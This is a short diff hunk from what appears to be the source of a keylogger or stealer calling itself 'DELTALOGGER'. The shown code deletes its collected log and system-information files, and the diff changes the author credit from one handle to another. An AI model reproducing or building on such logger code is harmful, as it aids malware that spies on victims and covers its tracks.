@@ -170,6 +170,6 @@ delete_files = [logs, system_information]
 for file in delete_files:
     os.remove(file_path + extend + file)
 
-# Developed by @Degnato
+# Developed by @Alphvino
 # Still in developing
 # GOODBYE FROM DELTALOGGER!
